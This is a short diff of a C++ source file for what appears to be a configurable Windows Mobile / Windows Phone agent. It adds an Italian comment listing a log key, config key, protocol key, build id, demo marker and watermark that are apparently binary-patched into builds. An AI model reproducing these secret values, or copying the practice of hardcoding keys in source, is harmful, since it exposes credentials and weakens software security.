@@ -18,6 +18,18 @@ wstring g_StrDemo;
 * Variabili globali utilizzate dal configuratore
 */
 
+/*
+chiavi che alor binaripatcha
+log key: WfClq6HxbSaOuJGaH5kWXr7dQgjYNSNg
+config key: 6uo_E0S4w_FD0j9NEhW2UpFw9rwy90LY
+proto key: ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ
+build id: EMp7Ca7-fpOBIr
+demo marker: Pg-WaVyPzMMMMmGbhP6qAigT
+water mark: B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW
+
+*/
+
+
 // Subversion
 ///BYTE g_Subtype[16] = "WINMO\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
 BYTE g_Subtype[16] = "WINPHONE\x00\x00\x00\x00\x00\x00\x00";
